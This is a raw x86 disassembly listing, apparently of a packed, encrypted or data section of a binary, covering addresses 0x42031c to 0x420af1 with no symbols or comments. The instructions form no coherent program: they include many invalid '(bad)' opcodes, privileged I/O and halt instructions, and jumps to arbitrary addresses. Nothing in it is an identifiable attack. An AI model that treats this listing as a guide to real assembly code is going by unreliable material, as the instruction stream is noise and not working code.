  42031c:	cli    
  42031d:	popa   
  42031e:	cmc    
  42031f:	jmp    0x868eeee9
  420324:	fcom   DWORD PTR [edi-0x51]
  420327:	sub    DWORD PTR [ecx-0x21ac65c8],ebp
  42032d:	stos   BYTE PTR es:[edi],al
  42032e:	call   0xe069:0xe54106ec
  420335:	pop    edi
  420336:	std    
  420337:	add    DWORD PTR [ecx-0x40992a8b],ebp
  42033d:	mov    ?,WORD PTR [esi-0x38]
  420340:	ins    DWORD PTR es:[edi],dx
  420341:	dec    edx
  420342:	pop    esi
  420343:	fistp  DWORD PTR [ebp-0x18]
  420346:	push   ebp
  420347:	fidivr DWORD PTR [ecx-0x1]
  42034a:	adc    eax,0x737e5044
  42034f:	mov    al,0x66
  420351:	dec    esp
  420352:	aaa    
  420353:	add    al,0x2
  420355:	jno    0x420347
  420357:	mov    bl,0xe9
  420359:	in     al,0x5a
  42035b:	jns    0x420342
  42035d:	mov    cl,0x4e
  42035f:	pushf  
  420360:	hlt    
  420361:	pushf  
  420362:	mov    eax,ds:0x7dd476ad
  420367:	mov    bh,0xaf
  420369:	scas   al,BYTE PTR es:[edi]
  42036a:	rcl    DWORD PTR [edi-0x6477bab2],0x54
  420371:	push   0xffffff9b
  420373:	sub    DWORD PTR [ebx+0x5c0ffc7],edi
  420379:	aam    0x7e
  42037b:	loop   0x42030d
  42037d:	mov    BYTE PTR [ebx+0x2f],al
  420380:	mov    eax,ds:0x278cb8a1
  420385:	dec    edi
  420386:	gs push ebp
  420388:	jecxz  0x4203cc
  42038a:	inc    edx
  42038b:	int    0xc2
  42038d:	mov    dl,0x6
  42038f:	jle    0x420314
  420391:	mov    WORD PTR [edx],es
  420393:	aas    
  420394:	ja     0x420338
  420396:	or     cl,BYTE PTR [edx-0x28]
  420399:	ins    DWORD PTR es:[edi],dx
  42039a:	pop    ebp
  42039b:	loop   0x4203ef
  42039d:	push   0x64c265a0
  4203a2:	jns    0x42032a
  4203a4:	push   0x77f2c715
  4203a9:	test   BYTE PTR [ebx],0xdf
  4203ac:	ss jmp 0xfb4d:0x385ba5f3
  4203b4:	cmp    al,0xcc
  4203b6:	clc    
  4203b7:	cwde   
  4203b8:	jl     0x42034b
  4203ba:	ffreep st(1)
  4203bc:	cmp    DWORD PTR [ecx-0x14],ebp
  4203bf:	je     0x42042c
  4203c1:	jmp    0x3cd2:0x70b0febd
  4203c8:	mov    ecx,0x79b5aedf
  4203cd:	xchg   DWORD PTR [edi],ebx
  4203cf:	pop    ebp
  4203d0:	(bad)  
  4203d1:	loope  0x4203eb
  4203d3:	ds loope 0x42041f
  4203d6:	dec    edi
  4203d7:	xchg   esi,eax
  4203d8:	mov    esi,0xb4494c3f
  4203dd:	and    ebx,DWORD PTR [eax-0x5]
  4203e0:	std    
  4203e1:	push   0x59ed025
  4203e6:	lods   eax,DWORD PTR ds:[esi]
  4203e7:	test   eax,0x49954b48
  4203ec:	ja     0x420377
  4203ee:	mov    ebp,0xdeb62faf
  4203f3:	mov    al,ds:0x2661a967
  4203f8:	repnz xchg ebx,eax
  4203fa:	jae    0x420451
  4203fc:	mov    eax,0x14826d03
  420401:	and    edx,DWORD PTR [eax+esi*4-0x2e]
  420405:	mov    al,ds:0x58ff8082
  42040a:	iret   
  42040b:	xchg   BYTE PTR [edi-0x26],ah
  42040e:	xchg   ecx,eax
  42040f:	(bad)  [esi+eiz*2]
  420412:	inc    ecx
  420413:	dec    eax
  420414:	mov    ebx,0x18555956
  420419:	xor    eax,0x50dd8175
  42041e:	xor    eax,0x6aff4218
  420423:	inc    ebx
  420424:	add    esi,esp
  420426:	xor    DWORD PTR [ecx+eax*8-0x4234c533],edx
  42042d:	dec    esi
  42042e:	jae    0x420454
  420430:	mov    edx,DWORD PTR [eax+0x3c]
  420433:	sbb    cl,BYTE PTR [edx-0x58]
  420436:	js     0x420462
  420438:	sub    DWORD PTR [ebx-0x5e300a3e],esp
  42043e:	xchg   ecx,eax
  42043f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420440:	sbb    BYTE PTR [esi],dh
  420442:	in     eax,0x61
  420444:	push   0xffffff8c
  420446:	loopne 0x420406
  420448:	adc    ch,BYTE PTR [esi-0x19730ca0]
  42044e:	sti    
  42044f:	or     eax,0xe065708
  420454:	pushf  
  420455:	ins    BYTE PTR es:[edi],dx
  420456:	and    eax,0xe23f0827
  42045b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42045c:	out    0x3e,eax
  42045e:	rcr    bl,cl
  420460:	push   esi
  420461:	int3   
  420462:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420463:	enter  0x584c,0xf
  420467:	pop    ss
  420468:	sbb    BYTE PTR [edx+0x9],cl
  42046b:	es jle 0x42042e
  42046e:	mov    edi,0xb0a1a8cb
  420473:	(bad)  
  420474:	pop    eax
  420475:	jne    0x4204f2
  420477:	xchg   esp,eax
  420478:	cmp    al,al
  42047a:	inc    esi
  42047b:	call   FWORD PTR [esi+0x14]
  42047e:	lock aas 
  420480:	or     DWORD PTR [ecx-0x10],ebx
  420483:	mov    al,gs:0x667a7ff8
  420489:	pushf  
  42048a:	lock sbb DWORD PTR [ecx],ebx
  42048d:	ret    
  42048e:	jecxz  0x420431
  420490:	jp     0x4204fd
  420492:	aaa    
  420493:	std    
  420494:	fnstcw WORD PTR [ebp+0x7b6dd704]
  42049a:	push   ds
  42049b:	fisubr WORD PTR [esi-0x3a9621a4]
  4204a1:	ret    
  4204a2:	sub    ch,BYTE PTR [edi+0x5d]
  4204a5:	(bad)  
  4204a7:	pusha  
  4204a8:	loope  0x42050b
  4204aa:	das    
  4204ab:	dec    ebp
  4204ac:	lds    ebx,FWORD PTR [ecx+0xad8aa0a]
  4204b2:	iret   
  4204b3:	cmp    dl,ch
  4204b5:	mov    eax,ds:0xec8312f
  4204ba:	push   0x680b6156
  4204bf:	push   edi
  4204c0:	push   ebx
  4204c1:	inc    edx
  4204c2:	xchg   ebx,eax
  4204c3:	adc    bl,BYTE PTR [edx-0x1e76e110]
  4204c9:	mov    eax,ds:0xeeafb18b
  4204ce:	in     al,dx
  4204cf:	jp     0x4204b3
  4204d1:	mov    ecx,0xc627c8d5
  4204d6:	pop    ss
  4204d7:	in     eax,dx
  4204d8:	jge    0x42051c
  4204da:	enter  0xc5ec,0xf8
  4204de:	mov    bh,0xf
  4204e0:	adc    esi,ebp
  4204e2:	call   0xae03603f
  4204e7:	in     eax,dx
  4204e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204e9:	repz jne 0x42053d
  4204ec:	or     edi,DWORD PTR [eax]
  4204ee:	(bad)  
  4204ef:	fcmovnbe st,st(2)
  4204f1:	sbb    al,0xf3
  4204f3:	aas    
  4204f4:	push   es
  4204f5:	jae    0x4204b7
  4204f7:	call   0x9a83:0xb19f3e90
  4204fe:	jnp    0x42056d
  420500:	fst    QWORD PTR [edx+ecx*2]
  420503:	push   edx
  420504:	ror    ecx,1
  420506:	and    ebp,edx
  420508:	inc    esi
  420509:	test   al,0xff
  42050b:	popf   
  42050c:	xchg   BYTE PTR ds:0xda5b5a30,ah
  420512:	dec    ebx
  420513:	repnz sbb eax,0x627e2d59
  420519:	jge    0x4204a9
  42051b:	ja     0x420542
  42051d:	dec    ebp
  42051e:	add    edi,DWORD PTR [edi+ecx*1]
  420521:	pop    ecx
  420522:	outs   dx,DWORD PTR ds:[esi]
  420523:	(bad)  
  420524:	cmp    ecx,DWORD PTR [esi+0x41987b34]
  42052a:	xchg   ebx,eax
  42052b:	mov    dl,0xd
  42052d:	mov    ds:0x292129bc,al
  420532:	mov    esp,0xff23c1c1
  420537:	push   cs
  420538:	sub    BYTE PTR [esi+0x34018c70],dh
  42053e:	and    bh,0x1f
  420541:	ficomp DWORD PTR [ebp-0x2abfd4c6]
  420547:	and    edi,edi
  420549:	push   0x360728dd
  42054e:	and    al,0x2c
  420550:	or     BYTE PTR [edi+0x7907cfc2],bl
  420556:	inc    ebp
  420557:	sbb    ah,bl
  420559:	sbb    eax,edx
  42055b:	outs   dx,BYTE PTR ds:[esi]
  42055c:	xor    ecx,DWORD PTR [ebx]
  42055e:	enter  0x12ba,0xbf
  420562:	xor    al,BYTE PTR [esi+0x40]
  420565:	and    ch,BYTE PTR [esi-0x69be1eb7]
  42056b:	int3   
  42056c:	ins    DWORD PTR es:[edi],dx
  42056d:	xor    al,0x8e
  42056f:	adc    al,0x24
  420571:	push   ebx
  420572:	fcomi  st,st(2)
  420574:	cs jns 0x4205a4
  420577:	arpl   sp,ax
  420579:	lahf   
  42057a:	mov    dl,BYTE PTR [edx+0x33]
  42057d:	xchg   esp,eax
  42057e:	fistp  WORD PTR [ebx]
  420580:	mov    esp,0x3e2f75da
  420585:	je     0x42051e
  420587:	sub    al,0xd3
  420589:	mov    bh,0xb1
  42058b:	ins    DWORD PTR es:[edi],dx
  42058c:	sahf   
  42058d:	pop    es
  42058e:	or     BYTE PTR [ecx+0x4acf3698],dh
  420594:	jo     0x420528
  420596:	daa    
  420597:	jmp    0xc9b984df
  42059c:	fidiv  DWORD PTR [ebx-0x19c320ce]
  4205a2:	hlt    
  4205a3:	(bad)  
  4205a4:	xor    edi,DWORD PTR [eax+0x51]
  4205a7:	mov    ds:0x246078d,al
  4205ac:	adc    ah,bh
  4205ae:	arpl   dx,sp
  4205b0:	jmp    DWORD PTR [ecx+0x5f77bfe7]
  4205b6:	add    eax,0x6878111c
  4205bb:	dec    edx
  4205bc:	push   ebp
  4205bd:	xchg   cl,bl
  4205bf:	aad    0x69
  4205c1:	mov    BYTE PTR [ebp+0x19d5920d],cl
  4205c7:	or     eax,0xfb5a7249
  4205cc:	xchg   esi,eax
  4205cd:	push   cs
  4205ce:	enter  0x8724,0x5f
  4205d2:	xchg   ebx,eax
  4205d3:	int3   
  4205d4:	pop    esi
  4205d5:	loop   0x420573
  4205d7:	ins    DWORD PTR es:[edi],dx
  4205d8:	jno    0x42061c
  4205da:	in     al,0x8b
  4205dc:	syscall 
  4205de:	push   es
  4205df:	imul   ebp,DWORD PTR [esi+0x397b3532],0xffffff8d
  4205e6:	push   esp
  4205e7:	cmp    eax,DWORD PTR [ecx-0x2d]
  4205ea:	add    esp,ecx
  4205ec:	cld    
  4205ed:	(bad)  
  4205ee:	je     0x420625
  4205f0:	xchg   ebp,eax
  4205f1:	loop   0x420616
  4205f3:	inc    esi
  4205f4:	in     eax,dx
  4205f5:	aam    0x42
  4205f7:	inc    edi
  4205f8:	push   edi
  4205f9:	mov    esp,0x649bfef9
  4205fe:	ret    
  4205ff:	pop    edi
  420600:	jge    0x420618
  420602:	pop    es
  420603:	mov    ds:0x6617a457,al
  420608:	fcmovnb st,st(7)
  42060a:	sbb    al,0x56
  42060c:	std    
  42060d:	and    DWORD PTR [ebx+0x2f],esi
  420610:	(bad)
  420613:	fnstcw WORD PTR [esp+edx*4+0x4c5aba10]
  42061a:	ror    BYTE PTR ss:0x779c3ae4,cl
  420621:	rcr    BYTE PTR ds:0xfb22f47b,cl
  420627:	push   cs
  420628:	push   cs
  420629:	cdq    
  42062a:	mov    DWORD PTR [esi],esp
  42062c:	add    eax,0x6809cdb3
  420631:	sbb    al,0x20
  420633:	pushf  
  420634:	nop
  420635:	fcompp 
  420637:	es mov ebp,0xc3da1d39
  42063d:	aas    
  42063e:	pop    ebp
  42063f:	fist   DWORD PTR [ebp-0x2750ff53]
  420645:	clc    
  420646:	enter  0x1454,0xee
  42064a:	lds    esi,FWORD PTR [edx+0x1c7f624f]
  420650:	add    DWORD PTR [ebp+0x346e277b],0xac80cc93
  42065a:	fadd   DWORD PTR [edx-0x45]
  42065d:	aam    0x51
  42065f:	xchg   DWORD PTR [esi+eiz*2+0x6d63bba4],ecx
  420666:	add    ch,al
  420668:	ins    BYTE PTR es:[edi],dx
  420669:	dec    ebx
  42066a:	jne    0x420649
  42066c:	sbb    al,0xdc
  42066e:	pop    edx
  42066f:	gs in  eax,dx
  420671:	push   esi
  420672:	cs mov edx,0x2aba5a7
  420678:	js     0x420609
  42067a:	dec    edx
  42067b:	and    DWORD PTR [eax+ebx*2+0x2],0xfffffff4
  420680:	(bad)  
  420681:	div    ch
  420683:	xor    eax,DWORD PTR [edi+0x7dc40a72]
  420689:	sbb    dh,0x48
  42068c:	daa    
  42068d:	cld    
  42068e:	mov    eax,ds:0xab1b4d16
  420693:	daa    
  420694:	dec    ebp
  420695:	pop    ds
  420696:	cwde   
  420697:	mov    edx,ds
  420699:	xor    al,0x69
  42069b:	retf   0x676a
  42069e:	or     BYTE PTR [ecx+ebp*8],dl
  4206a1:	mov    cl,bl
  4206a3:	inc    ebp
  4206a4:	push   ss
  4206a5:	mov    edx,0x148285f3
  4206aa:	mov    dl,0x2
  4206ac:	js     0x42063a
  4206ae:	pop    ebp
  4206af:	(bad)  
  4206b0:	div    BYTE PTR [ebp-0x3b1221b1]
  4206b6:	mov    ds:0x299bf202,al
  4206bb:	fnstsw WORD PTR [esi]
  4206bd:	or     cl,BYTE PTR [eax-0x33]
  4206c0:	pop    ds
  4206c1:	ret    0xeaed
  4206c4:	bound  edx,QWORD PTR [ecx]
  4206c6:	bound  esp,QWORD PTR [ecx-0x23]
  4206c9:	dec    ebx
  4206ca:	adc    DWORD PTR [ecx+0x68],ecx
  4206cd:	test   DWORD PTR [edx+0x7e70f16a],esi
  4206d3:	std    
  4206d4:	mov    esi,ebp
  4206d6:	dec    edi
  4206d7:	or     edx,edx
  4206d9:	jae    0x4206bd
  4206db:	or     DWORD PTR [eax-0xc],ecx
  4206de:	popf   
  4206df:	fnstenv [edi-0x22]
  4206e2:	lods   al,BYTE PTR ds:[esi]
  4206e3:	xchg   ebx,eax
  4206e4:	cdq    
  4206e5:	add    al,0xe9
  4206e7:	pusha  
  4206e8:	repnz (bad) [esi]
  4206eb:	add    ebx,DWORD PTR [eax]
  4206ed:	stos   BYTE PTR es:[edi],al
  4206ee:	pusha  
  4206ef:	call   0xefacd97d
  4206f4:	cdq    
  4206f5:	ret    
  4206f6:	std    
  4206f7:	fimul  WORD PTR [esi-0x10802bbf]
  4206fd:	xchg   edx,eax
  4206fe:	sbb    al,0x36
  420700:	clc    
  420701:	(bad)  
  420702:	les    eax,FWORD PTR [edx+ecx*1-0x4a8a02cd]
  420709:	arpl   dx,dx
  42070b:	add    cl,dl
  42070d:	(bad)  
  42070e:	outs   dx,BYTE PTR ds:[esi]
  42070f:	xchg   DWORD PTR [edi],ebp
  420711:	jmp    0x18901a65
  420716:	cmp    al,0x49
  420718:	inc    esp
  420719:	sbb    dh,cl
  42071b:	mov    ?,WORD PTR [esi-0x26]
  42071e:	dec    eax
  42071f:	pop    ss
  420720:	dec    edx
  420721:	aaa    
  420722:	push   esp
  420723:	data16 jg 0x4206f1
  420726:	cmp    al,0xa6
  420728:	sub    al,0x85
  42072a:	pop    ax
  42072c:	jle    0x42077c
  42072e:	ins    BYTE PTR es:[edi],dx
  42072f:	loope  0x4206e8
  420731:	dec    edx
  420732:	lahf   
  420733:	imul   ebp,DWORD PTR [edx],0x78
  420736:	jmp    0xeee2:0x69b55d51
  42073d:	mov    dl,BYTE PTR [edx+0x17]
  420740:	lods   eax,DWORD PTR ds:[esi]
  420741:	ins    DWORD PTR es:[edi],dx
  420742:	in     eax,dx
  420743:	fisub  WORD PTR [edi]
  420745:	repz xchg ebx,eax
  420747:	aas    
  420748:	and    al,0xf2
  42074a:	jge    0x420784
  42074c:	lds    ecx,FWORD PTR [ebp-0x2b]
  42074f:	ret    0xfbb5
  420752:	fs leave 
  420754:	pusha  
  420755:	js     0x420738
  420757:	adc    eax,DWORD PTR [edx+ebx*1-0x70]
  42075b:	ror    BYTE PTR [edi-0x50],1
  42075e:	ret    0x9aff
  420761:	scas   eax,DWORD PTR es:[edi]
  420762:	(bad)  
  420763:	mov    eax,0x13dea2a4
  420768:	push   es
  420769:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42076a:	in     eax,0xff
  42076c:	and    BYTE PTR [eax-0x1c],dl
  42076f:	out    dx,al
  420770:	int3   
  420771:	ss leave 
  420773:	ja     0x4207cf
  420775:	(bad)  
  420776:	cwde   
  420777:	inc    ebx
  420778:	data16 jno 0x420745
  42077b:	mov    edx,0xbc195b1c
  420780:	in     al,dx
  420781:	add    eax,0xa9f34aa0
  420786:	cld    
  420787:	dec    eax
  420788:	hlt    
  420789:	adc    BYTE PTR [ebx],0x25
  42078c:	les    esi,FWORD PTR [esi+0x23]
  42078f:	xlat   BYTE PTR ds:[ebx]
  420790:	adc    bh,ch
  420792:	jmp    0xbd0a0fdb
  420797:	inc    esp
  420798:	jmp    0x295b13b6
  42079d:	aad    0xcf
  42079f:	sbb    BYTE PTR [esi+0x2e13c4fc],bh
  4207a5:	test   eax,0x87a44b23
  4207aa:	shr    esi,0x75
  4207ad:	cmp    edx,DWORD PTR [ecx+esi*4]
  4207b0:	pop    edi
  4207b2:	fadd   DWORD PTR [ebp-0x30]
  4207b5:	jecxz  0x4207a0
  4207b7:	repnz scas eax,DWORD PTR es:[edi]
  4207b9:	pusha  
  4207ba:	(bad)  
  4207bb:	lds    esp,FWORD PTR [edi-0x739535f0]
  4207c1:	sar    BYTE PTR [edi+0x60],0xd
  4207c5:	shr    esi,cl
  4207c7:	test   eax,0x339185ec
  4207cc:	cmp    BYTE PTR [ebx],0xb7
  4207cf:	dec    edx
  4207d0:	pop    esp
  4207d1:	dec    ebp
  4207d2:	ret    0xd51d
  4207d5:	test   bh,0xf5
  4207d8:	ins    DWORD PTR es:[edi],dx
  4207d9:	sbb    DWORD PTR [edx+0x35],esp
  4207dc:	les    esi,FWORD PTR [ecx-0x63]
  4207df:	push   esi
  4207e0:	xor    al,0x9
  4207e2:	ja     0x420841
  4207e4:	shr    ebx,cl
  4207e6:	add    DWORD PTR [ebp+edx*1+0x27285202],0x43
  4207ee:	xor    DWORD PTR [eax+ebp*4],edx
  4207f1:	mov    ch,0xc7
  4207f3:	fsubr  QWORD PTR [ebx+0x2665c659]
  4207f9:	das    
  4207fa:	ret    0xff22
  4207fd:	pop    edx
  4207fe:	pop    esi
  4207ff:	cwde   
  420800:	in     al,dx
  420801:	pusha  
  420802:	clc    
  420803:	data16 std 
  420805:	mov    ds:0x1ec8f0e9,al
  42080a:	aaa    
  42080b:	pop    ebp
  42080c:	ret    0x78eb
  42080f:	jl     0x42085b
  420811:	or     esp,edx
  420813:	xor    al,0xe9
  420815:	mov    al,0x31
  420817:	mov    ds:0xd3d29b62,eax
  42081c:	xchg   esp,eax
  42081d:	mov    ecx,0x62b1858e
  420822:	retf   0x4462
  420825:	xchg   ebx,eax
  420826:	int3   
  420827:	rcr    BYTE PTR [esp+eiz*2-0x4ff16c9d],1
  42082e:	jg     0x420896
  420830:	and    ah,ch
  420832:	push   edi
  420833:	dec    eax
  420834:	jbe    0x42084a
  420836:	ret    
  420837:	loop   0x420814
  420839:	push   cs
  42083a:	adc    al,0x50
  42083c:	push   ebx
  42083d:	fwait
  42083e:	pop    ebx
  42083f:	sahf   
  420840:	aam    0x74
  420842:	pop    ebp
  420843:	out    dx,al
  420844:	outs   dx,DWORD PTR ds:[esi]
  420845:	test   BYTE PTR [eax-0x76],0xd8
  420849:	(bad)  
  42084a:	retf   
  42084b:	int    0x1f
  42084d:	div    DWORD PTR [esi-0x55]
  420850:	adc    al,0x1e
  420852:	(bad)  
  420854:	xor    edi,edx
  420856:	xchg   esi,eax
  420857:	sahf   
  420858:	leave  
  420859:	out    0xc0,al
  42085b:	es pop ds
  42085d:	inc    edi
  42085e:	mov    bl,0x35
  420860:	adc    BYTE PTR [edx+ecx*4+0x48],cl
  420864:	cmp    dh,BYTE PTR [ecx-0x546f2b98]
  42086a:	mov    DWORD PTR [esi],eax
  42086c:	scas   eax,DWORD PTR es:[edi]
  42086d:	shr    bh,1
  42086f:	fwait
  420870:	invd   
  420872:	int    0x2c
  420874:	sbb    cl,BYTE PTR [ebx+0x20579e99]
  42087a:	adc    eax,DWORD PTR [ecx]
  42087c:	or     cl,BYTE PTR [eax+0x63]
  42087f:	and    BYTE PTR [edi],ch
  420881:	ficom  WORD PTR ds:0xa309a00b
  420887:	ss mov ebx,0xc0d7bcd6
  42088d:	pop    ebp
  42088e:	fadd   QWORD PTR es:[ebx+0xf]
  420892:	dec    ecx
  420893:	jo     0x420901
  420895:	(bad)  
  420896:	and    al,BYTE PTR [ebx]
  420898:	mov    al,0x11
  42089a:	jmp    0x4a0184f9
  42089f:	les    edx,FWORD PTR [ebp-0x4e]
  4208a2:	mov    ecx,0xa60ecbc6
  4208a7:	jge    0x420833
  4208a9:	push   ss
  4208aa:	data16 out dx,al
  4208ac:	xor    BYTE PTR [eax-0xdc27866],bh
  4208b2:	push   0xfffffffc
  4208b4:	sar    BYTE PTR ds:0x67ea6a8b,cl
  4208ba:	iret   
  4208bb:	lahf   
  4208bc:	jno    0x4208d5
  4208be:	mov    al,ds:0x42939cca
  4208c3:	stos   DWORD PTR es:[edi],eax
  4208c4:	pop    edx
  4208c5:	jg     0x4208ca
  4208c7:	dec    ebx
  4208c8:	sbb    cl,BYTE PTR [ebx+0x5f1f93a3]
  4208ce:	xchg   DWORD PTR [esi-0x6f],esp
  4208d1:	mov    WORD PTR [eax],gs
  4208d3:	cmp    al,0x33
  4208d5:	xchg   esi,eax
  4208d6:	lods   eax,DWORD PTR ds:[esi]
  4208d7:	outs   dx,BYTE PTR ds:[esi]
  4208d8:	mov    edx,0x6fe1e9ed
  4208dd:	adc    DWORD PTR [eax+0x56],esi
  4208e0:	add    BYTE PTR ds:0xd7615ce8,0xc7
  4208e7:	imul   ebx,DWORD PTR ds:0x74d816ca,0x731b67cd
  4208f1:	outs   dx,DWORD PTR ds:[esi]
  4208f2:	sub    BYTE PTR [ecx+0x34],ah
  4208f5:	(bad)  
  4208f6:	push   esi
  4208f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208f8:	push   ebx
  4208f9:	stc    
  4208fa:	setns  BYTE PTR [ecx-0x68]
  4208fe:	sbb    eax,0xd6f1ceda
  420903:	pusha  
  420904:	cmp    cl,cl
  420906:	outs   dx,DWORD PTR ds:[esi]
  420907:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420908:	mov    fs,WORD PTR [ebx]
  42090a:	loope  0x42091a
  42090c:	xor    ch,BYTE PTR [eax+0x32]
  42090f:	xlat   BYTE PTR ds:[ebx]
  420910:	xchg   BYTE PTR cs:[ecx+ebp*1],cl
  420914:	mov    ebx,DWORD PTR [edi]
  420916:	mov    BYTE PTR [edx+eiz*1+0x3efbd815],dl
  42091d:	in     eax,0xe0
  42091f:	xchg   edx,eax
  420920:	loop   0x4208d9
  420922:	idiv   dh
  420924:	cwde   
  420925:	cmp    eax,0x15230639
  42092a:	mov    ds:0xa2cbadaa,eax
  42092f:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  420931:	dec    ebp
  420932:	(bad)  
  420933:	sub    al,0xd3
  420935:	lods   al,BYTE PTR ds:[esi]
  420936:	pushf  
  420937:	imul   esp,DWORD PTR ds:0x4bd1d248,0x4805a496
  420941:	in     eax,dx
  420942:	mov    edi,0xfc5a8d8f
  420947:	sbb    eax,0xdb1b30ae
  42094c:	ja     0x42098a
  42094e:	imul   ecx,DWORD PTR [edi],0x7db41da8
  420954:	xor    BYTE PTR [ebp+0x50fa814f],ch
  42095a:	dec    esp
  42095b:	pop    esi
  42095c:	in     al,0x11
  42095e:	jo     0x4209a3
  420960:	stos   DWORD PTR es:[edi],eax
  420961:	adc    eax,0x2cb0c9a
  420966:	addr16 popf 
  420968:	dec    ebp
  420969:	rcl    eax,0xd1
  42096c:	pop    es
  42096d:	retf   
  42096e:	or     BYTE PTR [ecx-0x21],bh
  420971:	pop    ss
  420972:	mov    WORD PTR [eax],ds
  420974:	sbb    DWORD PTR [ebx],0xffffffb2
  420977:	sahf   
  420978:	sbb    eax,0x9de326a0
  42097d:	pusha  
  42097e:	mov    ah,0xcc
  420980:	fwait
  420981:	or     eax,0x794a3672
  420986:	into   
  420987:	test   cl,dl
  420989:	pop    ecx
  42098a:	repz sbb DWORD PTR [ecx-0x39b83267],eax
  420991:	enter  0x5a20,0x50
  420995:	pop    es
  420996:	mov    ebx,0x2fd5ff9
  42099b:	(bad)  
  42099c:	pusha  
  42099d:	enter  0x459f,0xf6
  4209a1:	pop    ds
  4209a2:	push   edi
  4209a3:	and    edx,eax
  4209a5:	xchg   edi,eax
  4209a6:	add    BYTE PTR [esi+0x16e963de],ah
  4209ac:	icebp  
  4209ad:	push   ds
  4209ae:	cmp    DWORD PTR [ecx+0x34],0x44eaa758
  4209b5:	adc    edi,DWORD PTR [eax+0x5e]
  4209b8:	sahf   
  4209b9:	in     al,0x5f
  4209bb:	dec    ecx
  4209bc:	xor    BYTE PTR [eax-0x7],0x1e
  4209c0:	sbb    al,cl
  4209c2:	mov    eax,ds:0x5e6683db
  4209c7:	into   
  4209c8:	inc    edx
  4209c9:	jmp    0x72a96b7d
  4209ce:	sbb    ebx,DWORD PTR [ebx]
  4209d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209d1:	cwde   
  4209d2:	retf   
  4209d3:	and    BYTE PTR [edx+0x31],bh
  4209d6:	out    0x97,eax
  4209d8:	aad    0xdf
  4209da:	pop    esi
  4209db:	add    ecx,DWORD PTR [ebx+eax*2+0x30]
  4209df:	cld    
  4209e0:	out    0x95,eax
  4209e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209e3:	jae    0x4209f7
  4209e5:	loopne 0x420a65
  4209e7:	int    0xe7
  4209e9:	fwait
  4209ea:	jmp    0x420983
  4209ec:	inc    edi
  4209ed:	sbb    eax,0xbf868bef
  4209f2:	in     eax,dx
  4209f3:	add    cl,BYTE PTR [esp+eiz*4+0x59fc6636]
  4209fa:	jno    0x420a59
  4209fc:	lods   eax,DWORD PTR ds:[esi]
  4209fd:	lods   eax,DWORD PTR ds:[esi]
  4209fe:	or     DWORD PTR [ebx-0x80],ebp
  420a01:	out    dx,al
  420a02:	add    esp,DWORD PTR [ecx]
  420a04:	adc    DWORD PTR [edx+0x65],ebx
  420a07:	stos   DWORD PTR es:[edi],eax
  420a08:	mov    esi,0x14dbf294
  420a0d:	ja     0x42099c
  420a0f:	pop    edi
  420a10:	sub    eax,DWORD PTR [eax-0x3a]
  420a13:	cmp    BYTE PTR [ebx-0x651c5ee3],bh
  420a19:	int    0x36
  420a1b:	xchg   esi,edi
  420a1d:	ds or  ah,bh
  420a20:	jns    0x4209fc
  420a22:	adc    al,0xb0
  420a24:	mov    ds:0xac9db662,eax
  420a29:	cld    
  420a2a:	jle    0x4209da
  420a2c:	add    bh,bl
  420a2e:	mov    ecx,0xe320eaec
  420a33:	or     eax,0x5bcfe3
  420a38:	xchg   ebx,eax
  420a39:	scas   al,BYTE PTR es:[edi]
  420a3a:	pop    ds
  420a3b:	mov    ebx,0xb0afc6ca
  420a40:	xchg   ecx,eax
  420a41:	aas    
  420a42:	jg     0x420a7c
  420a44:	pop    edx
  420a45:	popa   
  420a46:	icebp  
  420a47:	test   al,0x40
  420a49:	dec    ebx
  420a4a:	xchg   ebp,eax
  420a4b:	push   ss
  420a4c:	mov    al,0x64
  420a4e:	imul   esi,DWORD PTR [edi+0x6e],0x70314f0e
  420a55:	outs   dx,BYTE PTR ds:[esi]
  420a56:	and    dl,BYTE PTR [eax]
  420a58:	fnstenv [ecx-0xe]
  420a5b:	pusha  
  420a5c:	mov    DWORD PTR [edi+0x44],ebp
  420a5f:	mov    ah,0x5e
  420a61:	and    al,0xf6
  420a63:	sub    ah,bl
  420a65:	mov    ecx,0x9454445a
  420a6a:	mov    ds:0x11c2763a,al
  420a6f:	out    0x78,eax
  420a71:	and    ah,BYTE PTR [eax]
  420a73:	jb     0x420a59
  420a75:	(bad)  
  420a76:	pop    ebp
  420a77:	fmul   st(3),st
  420a79:	mov    eax,0xdd6a4873
  420a7e:	xchg   sp,ax
  420a80:	pop    ecx
  420a81:	fisubr DWORD PTR [eax-0x29]
  420a84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a85:	or     eax,0x86026451
  420a8a:	adc    BYTE PTR ds:[ebx+0x201bfbd3],ch
  420a91:	inc    ecx
  420a92:	mov    ebp,0x9863e62d
  420a97:	xor    DWORD PTR [ecx-0x12b7357],esi
  420a9d:	mov    edi,0xbd54e246
  420aa2:	push   esi
  420aa3:	pop    eax
  420aa4:	dec    ebp
  420aa5:	sbb    al,0xeb
  420aa7:	loope  0x420aab
  420aa9:	adc    dl,BYTE PTR [eax-0x73]
  420aac:	or     ecx,ebp
  420aae:	shl    BYTE PTR [eax-0x7d],1
  420ab1:	out    0xe,eax
  420ab3:	mov    BYTE PTR [eax+ebp*1-0x4202fa41],ah
  420aba:	hlt    
  420abb:	mov    edx,0xce2d532d
  420ac0:	fnsave [esi-0xc]
  420ac3:	je     0x420ad3
  420ac5:	jb     0x420abe
  420ac7:	nop
  420ac8:	lahf   
  420ac9:	jmp    FWORD PTR [esi]
  420acb:	push   esp
  420acc:	mov    ecx,esi
  420ace:	xchg   esp,eax
  420acf:	dec    eax
  420ad0:	cli    
  420ad1:	icebp  
  420ad2:	call   0xf615dfbc
  420ad7:	mov    dh,0xd6
  420ad9:	(bad)  
  420ada:	daa    
  420adb:	cwde   
  420adc:	out    dx,eax
  420add:	lea    eax,[esi+0x4e7dfe5a]
  420ae3:	cld    
  420ae4:	mov    cl,0x75
  420ae6:	adc    DWORD PTR [ecx],0x2e
  420ae9:	sbb    BYTE PTR [ebp-0x70571276],al
  420aef:	lock (bad) 
  420af1:	fstp   DWORD PTR [ecx]
